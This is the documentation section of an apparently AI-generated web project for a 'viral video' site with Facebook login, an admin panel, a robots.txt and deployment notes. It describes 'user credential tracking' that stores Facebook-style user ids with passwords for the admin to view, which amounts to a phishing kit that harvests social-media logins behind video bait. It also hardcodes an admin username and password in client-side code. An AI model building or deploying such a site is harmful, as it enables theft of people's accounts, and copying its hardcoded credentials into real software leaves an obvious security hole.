# viral-video-site
README.md (Project Documentation)
```markdown
# Viral Video Website

A complete viral video sharing platform with:
- Public video viewing
- Facebook login integration
- Admin panel for content management

## Features
- User authentication via Facebook
- Admin dashboard (Username: Minarul5454, Password: Minarul5454)
- Video upload with 200MB limit
- User credential tracking

## Setup
1. Clone this repository
2. For Facebook login:
   - Create app at [Facebook Developers](https://developers.facebook.com/)
   - Update `js/auth.js` with your App ID
3. Open `index.html` in browser

## File Structure
```
viral-video-site/
├── index.html
├── admin.html
├── login.html
├── css/
├── js/
├── assets/
└── videos/
```

## Technical Stack
- HTML5, CSS3, JavaScript
- LocalStorage for data persistence
- Facebook JavaScript SDK
```

### 14. robots.txt (SEO)
```txt
User-agent: *
Allow: /
Disallow: /admin.html
Disallow: /login.html
```

### Complete Implementation Notes:

1. **Facebook Login Setup**:
   - Register your app at [Facebook Developers](https://developers.facebook.com/)
   - Replace the placeholder in `auth.js` with:
   ```javascript
   FB.init({
     appId: 'YOUR_APP_ID',
     cookie: true,
     xfbml: true,
     version: 'v12.0'
   });
   ```

2. **Admin Credentials**:
   - Hardcoded in `auth.js` as:
   ```javascript
   if (username === 'Minarul5454' && password === 'Minarul5454')
   ```

3. **Video Uploads**:
   - Files are stored as Blob URLs in localStorage
   - Maximum 200MB file size enforced
   - Supported formats: MP4, AVI, MOV, MKV

4. **User Credentials Storage**:
   - Stored in localStorage under 'credentials' key
   - Each entry contains:
     ```javascript
     {
       id: 'fb_RANDOM_ID',
       password: 'RANDOM_PASSWORD',
       date: 'ISO_TIMESTAMP'
     }
     ```

5. **To Deploy**:
   - Upload all files to your web hosting
   - Ensure PHP is enabled if using .htaccess
   - Set proper file permissions (755 for folders, 644 for files)
